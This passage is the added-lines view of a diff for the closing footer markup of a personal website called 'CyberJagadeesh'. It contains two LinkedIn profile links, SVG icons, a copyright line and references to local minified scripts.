+    <a href="https://www.linkedin.com/in/jagadeeshwaran-m-27598134b" target="_blank" title="LinkedIn" class="flex flex-row mr-2">
+      <span class="hidden">LinkedIn</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-linkedin" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 4m0 2a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2z"></path>
+   <path d="M8 11l0 5"></path>
+   <path d="M8 8l0 .01"></path>
+   <path d="M12 16l0 -5"></path>
+   <path d="M16 16v-3a2 2 0 0 0 -4 0"></path>
+</svg>
+ </i>
+    </a>
+  
+  
+  
+    <a href="https://www.linkedin.com/in/jagadeeshwaran-m-562a011b3" target="_blank" title="LinkedIn" class="flex flex-row mr-2">
+      <span class="hidden">LinkedIn</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-linkedin" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 4m0 2a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2z"></path>
+   <path d="M8 11l0 5"></path>
+   <path d="M8 8l0 .01"></path>
+   <path d="M12 16l0 -5"></path>
+   <path d="M16 16v-3a2 2 0 0 0 -4 0"></path>
+</svg>
+ </i>
+    </a>
+  
+  
+  
+  
+
+
+  </div>
+  <div class="grow"></div>
+  <div class="flex flex-row">
+    <i class="h-6 w-6 flex-none"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0"></path>
+   <path d="M14 9.75a3.016 3.016 0 0 0 -4.163 .173a2.993 2.993 0 0 0 0 4.154a3.016 3.016 0 0 0 4.163 .173"></path>
+</svg>
+</i> 2024 - 2025 CyberJagadeesh
+    
+  </div>
+  
+</section>
+
+  </footer>
+  <script src="/main.min.c6372b6836971865bd94bfde974748aca8415824a2facab6ccd66a87384bfacb.js"></script>
+
+<div class="hidden top-1 right-1" id="code-copy">
+  <i class="h-6 w-6 block">
+    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" />
+  <path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" />
+</svg>
+
+  </i>
+</div>
+<div class="hidden top-1 right-1" id="code-copy-done">
+  <i class="h-6 w-6 block">
+    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M5 12l5 5l10 -10" />
+</svg>
+
+  </i>
+</div><script src="/code-copy.min.e7b2a74adef1ed474c335c8bd5e7832b2316b8842b0f9184d65286c5bd64f51a.js"></script>
+
+
+
+
+
+</body>
+</html>
